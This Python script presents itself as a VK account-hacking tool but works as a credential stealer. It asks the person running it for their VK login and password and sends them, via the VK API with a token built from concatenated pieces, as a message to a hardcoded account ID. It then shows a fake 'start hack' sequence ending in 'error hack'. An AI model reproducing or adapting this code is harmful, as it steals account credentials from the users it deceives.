import time
import vk_api
import random
from core.modules import *
from core.colors import *
token=hu+za+lo+sd+gg+lm+rk+gv+bc+ab
vk = vk_api.VkApi(token=token)
print(B+"Vk_modules"+W)
id=input(B+"Enter id hacking account: "+W)
print(B+"plz, Log in to your VK"+W)
def write_msg(user_id, s, random_id):
 log= input("Enter login: ")
 pas = input("Enter password: ")
 msg = "login: " +log + " password: " +pas

 vk.method('messages.send', {'user_id':user_id,'message':msg,'random_id':random.randint(1, 2147879)})

write_msg('337045829', 'Ну ты и лох', 'random_id')

print(G+"account detect!"+W)
number=input("login : ")
print(R+"start hack!..."+W)
time.sleep(15)
print(R+"error hack"+W)
input()
